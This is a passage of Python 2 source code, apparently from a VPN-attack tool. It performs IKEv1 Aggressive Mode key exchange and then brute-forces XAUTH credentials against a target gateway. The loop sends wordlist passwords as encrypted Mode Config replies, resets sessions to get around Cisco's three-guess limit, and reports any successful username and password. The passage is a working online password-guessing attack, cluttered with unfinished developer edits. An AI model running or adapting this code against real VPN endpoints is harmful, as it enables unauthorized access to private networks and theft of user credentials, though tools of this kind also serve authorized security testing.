			initIV = ikeCrypto.calcIV(DHPubKey_i.decode('hex'),DHPubKey_r.decode('hex'), IVlen, hashType)
			
			dicCrypto["skeyid"] = skeyid
			dicCrypto["skeyid_a"] = skeyid_a
			dicCrypto["skeyid_d"] = skeyid_d
			dicCrypto["skeyid_e"] = skeyid_e
			dicCrypto["encKey"] = encKey
			dicCrypto["initIV"] = initIV
			#Hash payload
			arrayHash = ikeneg.ikeHash("0d",hash_i)#next payload - VID (13)
                        lenHash = len(arrayHash)
                        bytesHash = struct.pack(("B"*lenHash),*arrayHash)
			#VID payload
			arrayVID = ikeneg.ikeVID("00","09002689dfd6b712")
                        lenVID = len(arrayVID)
                        bytesVID = struct.pack(("B"*lenVID),*arrayVID)
                        #Encrypt everything but the header
			plainData = bytesHash+bytesVID
			plainPayload = ikeCrypto.calcPadding(encType, plainData)
			if debug > 0: 
                                print "Plain-text Payload: %s"%plainPayload.encode('hex')
			
                        cipher = ikeCrypto.ikeCipher(encKey, initIV, encType)
                        encPayload = cipher.encrypt(plainPayload)
			
			if debug > 0:
				print "Encrypted Payload: %s"%encPayload.encode('hex')

        		arrayencPayload = array.array('B', encPayload)
			lenencPayload = len(arrayencPayload)
			bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
			arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
			lenHDR = len(arrayHDR)
			bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
      	  		bytesIKE = bytesHDR+bytesencPayload
			ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
			dicCrypto["p2IV"] = bytesIKE.encode('hex')[-IVlen:]
                        dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]#p2IV and last block are the same at this point
			while len(packets) < 2:
				time.sleep(0.5)
					
                if len(packets) == 2:
			#Parse the header first
		        ikeHandling = ikehandler.IKEv1Handler(debug)
		        ikeHDR = ikeHandling.parseHeader(packets[-1])
			#Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
				if debug > 0:
	                                print "Packet received does not match this session, this is probably from a previous incarnation.1"
					print "Removing packet"
                                del packets[-1]
                                continue

			#Check for a new Message ID
			try:
				if ikeHDR[5] == dicCrypto["msgID"]:
					if debug > 0:
						print "Message ID has not changed"	
				
					curIV = dicCrypto["lastBlock"].decode('hex')
                        	        pass
                        	else:
					if debug > 0:
        	                        	print "Message ID has changed, recalculating IV"
					msgID = ikeHDR[5]
					curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)				
                        	        pass
			except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()

			#Check for informational packet
                        if ikeHDR[4] == 5:
				try:
					respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
				except:
					respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
                                if respDict["notmsgType"] == 16:
					if debug > 0:
                                        	print "Malformed Payload message received - retrying\n\n"
						print "(%s:%s)"%(username,password)

                                	xType = "05" #Informational
                                	#Process Delete payload
                                	#Hash payload
                                	if debug > 0:
                                        	print "Sending Delete payload to reset connection"
                                	arrayHash = ikeneg.ikeHash("0c",hash_i) # next payload - 12 (delete)
                                	lenHash = len(arrayHash)
                                	bytesHash = struct.pack(("B"*lenHash),*arrayHash)

                                	#Delete payload
                                	arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
                                	lenDel = len(arrayDel)
                                	bytesDel = struct.pack(("B"*lenDel),*arrayDel)

                                	#Encrypt everything but the header
                                	plainData = (bytesHash+bytesDel)
                                	plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                	if debug > 0:
                                        	print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                	#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                	#Calc message ID and current IV
                                	msgID = "0000111b"
                                	curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                	cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                	encPayload = cipher.encrypt(plainPayload)
                                	if debug > 0:
                                        	print "Encrypted Payload: %s"%encPayload.encode('hex')

                                	arrayencPayload = array.array('B', encPayload)
                                	lenencPayload = len(arrayencPayload)
                                	bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
	
                                	arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
                                	lenHDR = len(arrayHDR)
                                	bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)

                                	#Send Delete payload
                                	bytesIKE = bytesHDR+bytesencPayload
                                	ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
					time.sleep(5)
					del nonce_i,nonce_r,DHPubKey_i,ID_i,ID_r,rCookie,iCookie,msgID,privKey,DHPubKey_r,SA_i,xType,initIV,curIV
                                        del packets[:]
                                        del dupPackets[:]
                                        del listVIDs[:]
                                        dicCrypto.clear()
                                        respDict.clear()
                                        initDict.clear()
                                        dicVIDs.clear()
                                        continue

                                else:
                                        print "Informational packet received. Enable full debugging for more info. Exiting..."
                                        time.sleep(2) 
                                        exit()


			#Parse full packet
			respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
			#Update state/crypto dictionary
			dicCrypto.update(respDict) 
			dicCrypto["lastBlock"] = packets[-1][-IVlen:]
                        #Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
                        nonce_r = dicCrypto["nonce_r"]
                        ID_i = dicCrypto["ID_i"]
                        ID_r = dicCrypto["ID_r"]
                        rCookie = dicCrypto["rCookie"]
			iCookie = dicCrypto["iCookie"]
                        msgID = dicCrypto["msgID"]
                        privKey = dicCrypto["privKey"] 
                        DHPubKey_r = dicCrypto["DHPubKey_r"]
                        SA_i = dicCrypto["SA_i"]
			xType = int(dicCrypto["xType"])

			if xType != 6:
                                print "Expected Mode Config Transaction packet.1"
                                print "Exiting...\n"
				time.sleep(2)
                                exit()
			else:
				pass

			try:
				guessno
				wordline += 3
				guessno = 0
			except:
				wordline = 0
				guessno = 0

			for w in wordsfile:
				passcount += 1
				password = w.strip()
				#Print update if return is pressed
				readInput = [sys.stdin]
				inp = select.select(readInput, [], [], 0.1)[0]
				if inp:
					percent = wordline / float(wordcount) * 100
                                	print "Current Guess: %s:%s (%s%%)\n"%(username,password,int(percent))
					tcflush(sys.stdin, TCIOFLUSH)
					
				else:
					pass
				#Count number of guesses to reset connection after 3 for Cisco devices
				guessno += 1
				#Process response packet
				if debug > 0:
					print "\n--------------------Sending third packet - Encrypted XAUTH reply (username: %s password: %s)--------------------"%(username,password)
				xType = "06" #Mode Config transation			
                        	#Xauth Attributes data
				try:
					vendorType
	                                if vendorType == "cisco":
	                                        typeXAUTH = ikeneg.ikeXAUTH(0,16520,0,vendorType)
	                                        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
	                                        passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
	                                        mcfgAtts = typeXAUTH+userXAUTH+passXAUTH
	                                else:
	                                        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
	                                        passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
	                                        mcfgAtts = userXAUTH+passXAUTH
                                except:
                                        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
                                        passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
                                        mcfgAtts = userXAUTH+passXAUTH

				#Mode Config payload
				arrayMCFG = ikeneg.ikeModeCFG("00","02",mcfgAtts) #02 = mode config reply
	                        lenMCFG = len(arrayMCFG)
	                        bytesMCFG = struct.pack(("B"*lenMCFG),*arrayMCFG)
	
				#Mode Config Hash payload
				skeyid_a = dicCrypto["skeyid_a"]
				mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
				if debug > 0:
					print "Mode Config Hash = %s"%mcfgHash
	                        arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
	                        lenHash = len(arrayHash)
	                        bytesHash = struct.pack(("B"*lenHash),*arrayHash)

	                        #Encrypt everything but the header
	                        plainData = (bytesHash+bytesMCFG)
	                        plainPayload = ikeCrypto.calcPadding(encType, plainData)
	                        if debug > 0:
	                                print "Plain-text Payload: %s"%plainPayload.encode('hex')

				#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
	                        cipher = ikeCrypto.ikeCipher(encKey, dicCrypto["lastBlock"].decode('hex'), encType)
	                        encPayload = cipher.encrypt(plainPayload)

	                        if debug > 0:
	                                print "Encrypted Payload: %s"%encPayload.encode('hex')

	                        arrayencPayload = array.array('B', encPayload)
	                        lenencPayload = len(arrayencPayload)
	                        bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
	                        arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
	                        lenHDR = len(arrayHDR)
	                        bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
	                        bytesIKE = bytesHDR+bytesencPayload

	                        ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
				dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
				while len(packets) < 3:
					time.sleep(0.5)

						
                	        if len(packets) >= 3:
	                        	#Parse the header first
	                        	ikeHandling = ikehandler.IKEv1Handler(debug)
	                        	ikeHDR = ikeHandling.parseHeader(packets[-1])
	                        	#Check the packet is for this session
	                        	if ikeHDR[1] == dicCrypto["iCookie"]:
	                        	        pass
	                        	else:   
						if debug > 0:
		                        	        print "Packet received does not match this session, this is probably from a previous incarnation.2"
							print "Removing packet"
						
						print dicCrypto
						###***might be deleteing the wrong packet here, causing bug. looks unlikely as it would have to land in the miliseconds between processing the packet header and processing the full packet
						print packets
						###***update lastblock??
						#dicCrypto["lastBlock"] = packets[-1][-IVlen:]
	                        		del packets[-1]
						#try packets.remove[hexPacket] - needs hexpacket defined first
						###EDIT
						#continue #[-]Password not found, try another wordlist. Exiting...
						#pass #IV fails to decrypt, because the message ID check doesn't take place because next step is checking if the header excahnge type is 5 (informational) which it is due to this processing
						#wait for retransmission?
						#time.sleep(2)
						#break #goes too far out and tries to decrypt the same packet again so IV is incorrect? or updats the lastblock or doesn't when it shouldn't
						break # goes to "REMOVED ELSE" then repeasts that for the remainder of the wordlist
						###/EDIT

                        		if ikeHDR[4] == 5:
						try:
							respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
						except:
                                			respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
						###***add in additional exception here in case decryption fails?
                                		if respDict["notmsgType"] == 16:
                                        		#if debug > 0:
                                        		print "Malformed Payload message received - retrying\n\n"
                                        		print username,password

                                			#Delete payload
                                			if debug > 0:
                                				print "\n--------------------Sending Delete Packet--------------------"
                                			arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
                                			lenDel = len(arrayDel)
                                			bytesDel = struct.pack(("B"*lenDel),*arrayDel)

                                			#Encrypt everything but the header
                                			plainData = (bytesHash+bytesDel)
                                			plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                			if debug > 0:
                                				print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                			#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                			#Calc message ID and current IV
                                			msgID = "0000111b"
                                			curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                			cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                			encPayload = cipher.encrypt(plainPayload)

                                			if debug > 0:
                                				print "Encrypted Payload: %s"%encPayload.encode('hex')

                                			arrayencPayload = array.array('B', encPayload)
                                			lenencPayload = len(arrayencPayload)
                                			bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
	
                                			arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
                                			lenHDR = len(arrayHDR)
                                			bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
	
                                			#Send Delete payload
                                			bytesIKE = bytesHDR+bytesencPayload
                                			ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
							time.sleep(5)
 							del nonce_i,nonce_r,DHPubKey_i,ID_i,ID_r,rCookie,iCookie,msgID,privKey,DHPubKey_r,SA_i,xType,initIV,curIV
                                        		del packets[:]
                                        		del dupPackets[:]
                                        		del listVIDs[:]
                                        		dicCrypto.clear()
                                        		respDict.clear()
                                        		initDict.clear()
                                        		dicVIDs.clear()
                                        		continue

                                		else:
                                        		print "Informational packet received. Enable full debugging for more info. Exiting..."
                                        		time.sleep(2) 
                                        		exit()


					###***remove this? - this just hangs becaue it doesn't process the packet eventually
					###EDIT
                        		#else:
                                	#	pass
					###/EDIT
					###EDIT - tabbed section in
					###******IF THIS DOESN'T WORK UNTAB THE BELOW SECTION AND REINSTATE THE BOTTOM ELSE TO CATCH IF PACKET COUNT IS NOT >= 3!!!*****
					else:
		                        	try:   
		                        		#Check for a new Message ID
	        	                        	if ikeHDR[5] == dicCrypto["msgID"]:
	                	                	        if debug > 0:
	                	                	                print "Message ID has not changed 1"
								print dicCrypto
								print packets
		                                	        curIV = dicCrypto["lastBlock"].decode('hex')
		                                	        pass    
	       	                        		else:
	                                        		if debug > 0:
	                                        		        print "Message ID has changed, recalculating IV"
	                                        		msgID = ikeHDR[5]
	                                        		curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
	                                       			pass
	                        		except:
	                        		       	print "Invalid Message ID, too many concurrent sessions running. Wait 30 seconds and try again.\nExiting"
							time.sleep(2)
	                                		exit()

			
	        		        	respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
	        		        	#Update state/crypto dictionary
						dicCrypto = dict(dicCrypto.items() + respDict.items())
	        		        	dicCrypto["lastBlock"] = packets[-1][-IVlen:]
			                	#Pull the useful values from stored dictionary for crypto functions
			                	nonce_i = dicCrypto["nonce_i"]
			                	DHPubKey_i = dicCrypto["DHPubKey_i"]
			       	        	nonce_r = dicCrypto["nonce_r"]
			       	        	ID_i = dicCrypto["ID_i"]
		                        	ID_r = dicCrypto["ID_r"]
		                        	rCookie = dicCrypto["rCookie"]
		                        	iCookie = dicCrypto["iCookie"]
		                        	msgID = dicCrypto["msgID"]
		                        	privKey = dicCrypto["privKey"]
		                        	DHPubKey_r = dicCrypto["DHPubKey_r"]
		                        	SA_i = dicCrypto["SA_i"]
		                        	xType = int(dicCrypto["xType"])
		                        	if xType != 6:
		                        	        print "Expected Mode Config Transaction packet."
		                        	        print "Exiting...\n"
							time.sleep(2)
		                        	        exit()
		                        	else:   
		                        	        pass
						if int(dicCrypto["mcfgType"]) == 1:
							if debug > 0:
								print "Retransmitted XAUTH request received, Continuing..."
							del packets[-1]
							continue

	                                        if int(dicCrypto["mcfgType"]) == 3 and int(dicCrypto["XAUTH_STATUS"]) == 0:
							try:
								vendorType
							except:
								vendorType = "unknown"

							if vendorType == "cisco":
								if debug > 0:
									"XAUTH Authentication failed, restarting connection."
                                                	        if guessno == 3:
                                                	                if debug > 0:
                                                	                        print "Cisco 3 guess limit reached, restarting"
	                        					xType = "05" #Informational
									#Process Delete payload
                                                	                #Hash payload
                                                	                arrayHash = ikeneg.ikeHash("0c",hash_i) # next payload - 12 (delete)
                                                	                lenHash = len(arrayHash)
                                                	                bytesHash = struct.pack(("B"*lenHash),*arrayHash)
				
									#Delete payload
									arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
									lenDel = len(arrayDel)
									bytesDel = struct.pack(("B"*lenDel),*arrayDel)

									#Encrypt everything but the header
                        						plainData = (bytesHash+bytesDel)
                        						plainPayload = ikeCrypto.calcPadding(encType, plainData)
                        						if debug > 0:
                        				        		print "Plain-text Payload: %s"%plainPayload.encode('hex')

         			               				#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
									#Calc message ID and current IV
									msgID = "0000111b"
									curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                        						cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                        						encPayload = cipher.encrypt(plainPayload)

                        						if debug > 0:
                        				        		print "Encrypted Payload: %s"%encPayload.encode('hex')
			
        	        			        		arrayencPayload = array.array('B', encPayload)
        	                					lenencPayload = len(arrayencPayload)
        	                					bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
									
                                                                	arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
                                                                	lenHDR = len(arrayHDR)
                                                                	bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
		
									#Send Delete payload
									bytesIKE = bytesHDR+bytesencPayload
									ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
									time.sleep(5)
									del nonce_i,nonce_r,DHPubKey_i,ID_i,ID_r,rCookie,iCookie,msgID,privKey,DHPubKey_r,SA_i,xType,initIV,curIV
                                                                	del packets[:]
									del dupPackets[:]
									del listVIDs[:]
									dicCrypto.clear()
                                                                	respDict.clear()
                                                                	initDict.clear()
									dicVIDs.clear()
									#EDIT
									break
									#continue
									#/EDIT
								
								else:
									pass
							else:
        	                                	        pass

		                        	if dicCrypto["mcfgType"] == "03" or dicCrypto["mcfgType"] == 3 and int(dicCrypto["XAUTH_STATUS"]) == 1:
							#False positive check for older ASA's
							try:
								aType = int(authType)
							except:
								aType = int(authType,16)
							if vendorType == "cisco" and aType == 1 and wordline < 1:
								print "\n[-]Older ASA detected, run the tool again with authentication type 65001 (XAUTHInitPreShare) instead of type 1 (PSK). Exiting..."
							else:
								print "[*]XAUTH Authentication Successful! Username: %s Password: %s\nSending ACK packet...\n"%(username,password)

		                                	#Mode Config payload - ACK
		                                	ackXAUTH = ikeneg.ikeXAUTH(0,16527,"00")
		                                	mcfgAtts = ackXAUTH
		                                	arrayMCFG = ikeneg.ikeModeCFG("00","04",mcfgAtts) #04 = mode config ACK
		                                	lenMCFG = len(arrayMCFG)
		                                	bytesMCFG = struct.pack(("B"*lenMCFG),*arrayMCFG)

			                        	#Process response packet
							if debug > 0:
	                        				print "\n--------------------Sending third packet - Encrypted XAUTH ACK --------------------\n"
                        				xType = "06" #Mode Config transation

                        				#Hash payload
                        				skeyid_a = dicCrypto["skeyid_a"]
                        				mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
                        				if debug > 0:
                        				        print "Mode Config Hash = %s"%mcfgHash
                        				arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
                        				lenHash = len(arrayHash)
                        				bytesHash = struct.pack(("B"*lenHash),*arrayHash)

			                        	#Encrypt everything but the header
                			        	plainData = (bytesHash+bytesMCFG)
                        				plainPayload = ikeCrypto.calcPadding(encType, plainData)
                        				if debug > 0:
                                				print "Plain-text Payload: %s"%plainPayload.encode('hex')

                        				#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                        				cipher = ikeCrypto.ikeCipher(encKey, dicCrypto["lastBlock"].decode('hex'), encType)
                        				encPayload = cipher.encrypt(plainPayload)

                        				if debug > 0:
                                				print "Encrypted Payload: %s"%encPayload.encode('hex')

                        				arrayencPayload = array.array('B', encPayload)
                        				lenencPayload = len(arrayencPayload)
                        				bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
                        				arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
                        				lenHDR = len(arrayHDR)
                        				bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
                        				bytesIKE = bytesHDR+bytesencPayload

                        				ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                        				dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]

                                			#Delete payload
                                			arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
                                			lenDel = len(arrayDel)
                                			bytesDel = struct.pack(("B"*lenDel),*arrayDel)

                                			#Encrypt everything but the header
                                			plainData = (bytesHash+bytesDel)
                                			plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                			if debug > 0:
                                        			print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                			#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                			#Calc message ID and current IV
                                			msgID = "0000111b"
                                			curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                			cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                			encPayload = cipher.encrypt(plainPayload)
                                			if debug > 0:
                                        			print "Encrypted Payload: %s"%encPayload.encode('hex')

                                			arrayencPayload = array.array('B', encPayload)
                                			lenencPayload = len(arrayencPayload)
                                			bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
	
                                			arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
                                			lenHDR = len(arrayHDR)
                                			bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)

                                			#Send Delete payload
                                			bytesIKE = bytesHDR+bytesencPayload
                                			ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                        				time.sleep(1)
			                        	exit()

						if dicCrypto["mcfgType"] == "03" or dicCrypto["mcfgType"] == 3 and int(dicCrypto["XAUTH_STATUS"]) == 0:
							del packets[-1]
							pass

						else:
							pass
				###EDIT
				#"""
				if vendorType == "cisco":
					if wordline >= wordcount:
						print "[-]Password not found, try another wordlist. Exiting...\n"
						exit()
					else:
						continue
				#else:
					#pass
				#"""
				###/EDIT

			if vendorType != "cisco":
				###EDIT
				if wordline >= wordcount:
		                        print "[-]Password not found, try another wordlist. Exiting...\n"
        		                exit()
				else:
					continue
			#else:
				#pass
			###/EDIT

		###MARK - remove this section?
		print "REMOVED ELSE"
		continue
		"""
		else:
                        if debug > 0:
                                print "Response received, processing packet..."
                        #Parse the header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])

                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:   
				if debug > 0:
	                                print "Packet received does not match this session, this is probably from a previous incarnation.3"
					print "Removing packet"
                                del packets[-1]
                                continue

                        try:   
                                if ikeHDR[5] == dicCrypto["msgID"]:
					#MARK
                                        if debug > 0:
                                                print "Message ID has not changed2"
					print dicCrypto
					print packets
					
                                        curIV = dicCrypto["lastBlock"].decode('hex')
                                        pass    
                                else:
                                        if debug > 0:
                                                print "Message ID has changed, recalculating IV"
                                        msgID = ikeHDR[5]
                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        pass
                        except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()

                        respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                        #Update state/crypto dictionary
                        dicCrypto.update(respDict)
                        dicCrypto["lastBlock"] = packets[-1][-IVlen:]
		"""

	      #Exit if while condition is not met (eof)
	      ###EDIT
	      if wordline >= wordcount:
		      print "[-]Password not found, try another wordlist. Exiting...\n"
		      time.sleep(2)
		      exit()
	      else:
			pass
			#continue

	      ###/EDIT

	    elif connect:
		#Test a connection
		ikeneg = ikeclient.IKEv1Client(debug)
		ikeCrypto = crypto.ikeCrypto()
		sentPackets = 0
		status = 'p1_am1'
		if len(packets) == 0 and sentPackets == 0:
			print "\n--------------------Sending first Aggressive Mode packet--------------------"
			try:
				iCookie
			except:
				iCookie = ikeneg.secRandom(8).encode('hex')
			try:
				rCookie
			except:
				rCookie = "0000000000000000"

			initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,keyLen)
			dicCrypto = dict(initDict.items())
			time.sleep(speed)
			while len(packets) < 1:
				time.sleep(0.5)

		if len(packets) == 1:
			if debug > 0:
				print "Response received, processing packet..."
			flags = "01"
			ikeHandling = ikehandler.IKEv1Handler(debug)
			ikeHDR = ikeHandling.parseHeader(packets[-1])

			#Check the packet is for this session
			if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
				if debug > 0:
	                                print "Packet received does not match this session, this is probably from a previous incarnation.4"
        				print "Removing packet"
	                        del packets[0]
                                continue

                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."
				try:
					respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
				except:
					respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
				time.sleep(2)
                                exit()
                        else:   
				status = "p1_am2"
                                pass

                        flags = "01"
                        respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
                        dicVIDs = vid.dicVIDs
                        for i in listVIDs:
                                try:   
					if debug > 0:
	                                        print "VID received: %s (%s)"%(dicVIDs[i], i)
                                        if "Cisco" in dicVIDs[i]:
                                                vendorType = "cisco"
					elif "Watchguard" in dicVIDs[i]:
						vendorType = "watchguard"
                                except:
					if debug >0:
	                                        print "Unknown VID received: %s"%i

			#Combine the dictionaries from sent packet and received packet
			dicCrypto.update(respDict)
			#Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
			nonce_r = dicCrypto["nonce_r"]
			ID_i = dicCrypto["ID_i"]
			ID_r = dicCrypto["ID_r"]
			rCookie = dicCrypto["rCookie"]
			xType = dicCrypto["xType"]
			msgID = dicCrypto["msgID"]
			privKey = dicCrypto["privKey"]
			DHPubKey_r = dicCrypto["DHPubKey_r"]
			SA_i = dicCrypto["SA_i"]

			#Check exchange type is in the right format
			try:
				xType = hex(xType)[2:].zfill(2)
			except:
				pass
			
			#Construct final aggressive mode exchange packet
			print "\n--------------------Sending second Aggressive Mode packet--------------------"
			#Run Crypto Functions - DH first
			ikeDH = dh.DiffieHellman(DHGroup)
			secret = ikeDH.genSecret(privKey,int(DHPubKey_r,16))
			
			hexSecret = '{0:x}'.format(secret)#using new formating to deal with long int
			if debug > 0:
				print len(hexSecret)
				print hexSecret
			if len(hexSecret) % 2 != 0:
				hexSecret = "0" + hexSecret
			if debug > 0:
				print "Secret: %s"%secret
				print "Hexlified Secret: %s"%hexSecret

			skeyid = ikeCrypto.calcSKEYID(psk, nonce_i.decode('hex'), nonce_r.decode('hex'), hashType)
			hash_i = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'), ID_r.decode('hex'), ID_i.decode('hex'),"i",hashType)
			hash_r = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'),ID_r.decode('hex'), ID_i.decode('hex'),"r",hashType)
			skeyid_d = ikeCrypto.calcSKEYID_d(skeyid, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			skeyid_a = ikeCrypto.calcSKEYID_a(skeyid, skeyid_d, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			skeyid_e = ikeCrypto.calcSKEYID_e(skeyid, skeyid_a, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			if len(skeyid_e) < keyLen:
				encKey = ikeCrypto.calcKa(skeyid_e, keyLen, hashType)
                                if debug > 0:
                                        print "Encryption Key: %s"%encKey.encode('hex')
			else:
				encKey = skeyid_e[:keyLen]
				if debug > 0:
					print "Encryption Key: %s"%encKey.encode('hex')
			initIV = ikeCrypto.calcIV(DHPubKey_i.decode('hex'),DHPubKey_r.decode('hex'), IVlen, hashType)
			
			dicCrypto["skeyid"] = skeyid
			dicCrypto["skeyid_a"] = skeyid_a
			dicCrypto["skeyid_d"] = skeyid_d
			dicCrypto["skeyid_e"] = skeyid_e
			dicCrypto["encKey"] = encKey
			dicCrypto["initIV"] = initIV

			#Hash payload
			###***EDITED NEXT PAYLOAD TO TEST XAUTH
			arrayHash = ikeneg.ikeHash("0d",hash_i)#next payload 13 (0d) = VID or 11 notification?
                        bytesHash = ikeneg.packPacket(arrayHash)
			
			#VID payload
			arrayVID = ikeneg.ikeVID("00","09002689dfd6b712")
			bytesVID = ikeneg.packPacket(arrayVID)

                        #Encrypt everything but the header
			###***EDITED VID OUT
			plainData = bytesHash+bytesVID
			plainPayload = ikeCrypto.calcPadding(encType, plainData)
			if debug > 0: 
                                print "Plain-text Payload: %s"%plainPayload.encode('hex')
				
                        cipher = ikeCrypto.ikeCipher(encKey, initIV, encType)
                        encPayload = cipher.encrypt(plainPayload)
			
			if debug > 0:
				print "Encrypted Payload: %s"%encPayload.encode('hex')

        		arrayencPayload = array.array('B', encPayload)
			bytesencPayload = ikeneg.packPacket(arrayencPayload)
			arrayIKE = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
